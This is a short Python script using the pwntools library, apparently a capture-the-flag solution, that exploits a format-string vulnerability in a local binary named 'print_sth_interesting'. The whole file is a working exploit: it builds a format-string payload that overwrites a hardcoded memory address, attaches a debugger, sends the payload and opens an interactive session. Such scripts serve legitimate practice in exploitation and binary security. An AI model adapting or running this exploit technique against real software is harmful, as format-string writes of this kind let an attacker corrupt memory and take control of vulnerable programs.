#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'

buf_addr = 0x0804A038
fmt_len = 7

cn = process('./print_sth_interesting')

cn.recvuntil("Give me something to printf:")
pay = fmtstr_payload(fmt_len,{buf_addr:0xffff})
gdb.attach(cn)
cn.sendline(pay)
cn.interactive()
